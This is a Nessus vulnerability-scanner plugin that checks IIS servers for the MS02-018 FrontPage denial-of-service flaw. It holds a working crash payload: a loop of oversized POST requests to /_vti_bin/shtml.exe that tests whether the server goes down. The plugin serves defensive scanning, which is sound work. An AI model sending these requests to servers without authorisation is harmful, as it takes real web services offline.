#
# (C) Tenable Network Security, Inc.
#

# Thanks to: SPIKE v2.1 :)
#
# MS02-018 supercedes : MS01-043, MS01-025, MS00-084, MS00-018, MS00-006
#

include("compat.inc");

if(description)
{
 script_id(10937);
 script_cve_id("CVE-2000-0226", "CVE-2002-0072");
 script_bugtraq_id(1066, 4479);
 script_osvdb_id(1261, 3326);
 script_xref(name:"MSFT", value:"MS02-018");

 script_version ("$Revision: 1.48 $");
 script_name(english:"Microsoft IIS Multiple Remote DoS (MS02-018 / Q319733)");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"There's a denial of service vulnerability on the remote host
in the Front Page ISAPI filter.

An attacker may use this flaw to prevent the remote service
from working properly." );
 script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/bulletin/ms02-018" );
 # https://web.archive.org/web/20070525180535/http://archives.neohapsis.com/archives/vulnwatch/2002-q2/0012.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e0aebd31" );
 script_set_attribute(attribute:"solution", value:
"Apply the patch referenced above." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/04/11");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/03/20");
 script_cvs_date("$Date: 2016/11/23 20:31:32 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:iis");
script_end_attributes();

 script_summary(english: "Tests for a DoS in IIS");
 script_category(ACT_DENIAL);
 script_dependencie("http_version.nasl", "iis_asp_overflow.nasl");
 script_family(english:"Web Servers");
 script_copyright(english: "This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

res = is_cgi_installed3(item:"/_vti_bin/shtml.exe", port:port);
if (!res) exit(0);

banner = get_http_banner(port:port);
if (! banner) exit(0);
if (egrep(pattern: "^Server:.*IIS/[45]\.", string: banner)) exit(0);

for(i=0;i<5;i=i+1)
{
 r = http_send_recv3( port: port, method: 'POST', 
     		      item: strcat("/_vti_bin/shtml.exe?", crap(35000), ".html") );
 if (isnull(r) && i > 0) break;
 sleep(2);
}

if (http_is_dead(port: port, retry: 3)) security_warning(port);
